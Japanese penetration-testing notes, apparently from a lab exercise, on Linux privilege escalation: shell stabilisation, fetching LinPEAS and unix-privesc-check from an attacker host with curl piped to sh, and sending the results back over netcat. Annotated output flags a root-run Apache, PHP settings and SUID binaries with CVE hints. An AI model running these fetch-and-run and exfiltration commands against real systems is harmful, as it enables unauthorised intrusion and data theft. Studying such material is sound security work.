# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

## unix-privesc-check

### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 8888
nc -lvnp 9002 | tee unix-privesc-check.out
```
```zsh
# Target
curl 192.168.45.182:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.182 9002
```

### 実行結果抽出 -> 実行失敗



---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 8888
nc -lvnp 9002 | tee linpeas.out
```
```zsh
# Target
curl 192.168.45.182:8888/linpeas.sh | sh | nc -q 0 192.168.45.182 9002
```

### 実行結果抽出

```powershell
# rootがapacheを動作させているので、LFIさせられれば、root に権限昇格
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                               

root      1402  0.0  2.5 492324 26028 ?        Ss   00:04   0:00 /usr/sbin/apache2 -k start

# mdadmという見慣れないcron
══╣ Cron jobs list                                                            
/usr/bin/crontab                                                              
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                      

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 17  2021 .
drwxr-xr-x 102 root root 4096 May 27  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Mar  7  2018 mdadm

# ポート22（おそらくSSH）が動作
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                    
══╣ Active Ports (netstat)                                                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN    

══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                                       
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
pkexec version 0.105

# allow_url_fopenがonなのでFile Inclusion系の攻撃が可能
-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct  7  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

# sshでログインできる？
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
/var/www/openemr/vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA.php

# SUID系は特になさそう
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                                                                                                             
strings Not Found                                                                                                                                                                                                                                                                                                           
-rwsr-xr-x 1 root root 99K Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                                                                                                                                                                                                                          
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 111K Feb  2  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su

```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク


---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン



---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール



